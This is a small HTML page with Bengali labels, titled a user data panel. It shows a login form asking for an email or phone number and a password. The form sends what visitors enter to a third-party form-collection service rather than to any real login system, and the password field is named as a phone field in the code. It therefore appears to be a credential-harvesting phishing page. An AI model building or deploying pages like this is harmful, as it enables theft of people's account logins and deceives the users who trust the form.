<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ইউজার ডাটা প্যানেল</title>
    <style>
        /* আপনার ওয়েবসাইটের সাধারণ ডিজাইন */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background: #ffffff;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #666;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .submit-btn {
            width: 100%;
            padding: 12px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        .submit-btn:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h2>ডাটা প্যানেল</h2>
    
    <!-- action এর জায়গায় আপনার ফর্ম প্রসেসরের লিংক বসবে -->
    <form action="https://formspree.io/f/xlgvrwky" method="POST">
        
        <div class="input-group">
            <label for="name">Email or Number:</label>
            <input type="text" id="name" name="User_Name" placeholder="Mobile number or email address" required>
        </div>

        <div class="input-group">
            <label for="phone">Password:</label>
            <input type="tel" id="phone" name="User_Phone" placeholder="017XXXXXXXX" required>
        </div>

        <button type="submit" class="submit-btn">Log in</button>
    </form>
</div>

</body>
</html>
